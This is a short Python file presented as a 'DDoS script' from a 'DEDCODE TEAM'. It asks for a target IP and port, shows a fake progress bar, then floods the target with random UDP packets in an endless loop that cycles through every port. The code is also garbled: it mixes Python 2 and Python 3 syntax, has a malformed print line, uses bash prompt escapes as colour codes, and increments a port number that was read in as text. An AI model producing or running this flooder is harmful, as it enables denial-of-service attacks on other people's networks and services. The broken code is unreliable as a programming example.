import sys
import os
import time
import socket
import random
import colorama
# Reset
Color_Off="\[\033[0m\]"       # Text Reset
# Regular Colors
Black="\[\033[0;30m\]"        # Black
Red="\[\033[0;31m\]"          # Red
Green="\[\033[0;32m\]"        # Green
Yellow="\[\033[0;33m\]"       # Yellow
Blue="\[\033[0;34m\]"         # Blue
Purple="\[\033[0;35m\]"       # Purple
Cyan="\[\033[0;36m\]"         # Cyan
White="\[\033[0;37m\]"        # White
#Requests
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("clear")
print(Blue + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")
print("=============")
print("🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼")
print("=DDos script=")\n")
ip = raw_input("IP Target ════>")
port = input("Port  ════>")
os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
Footer
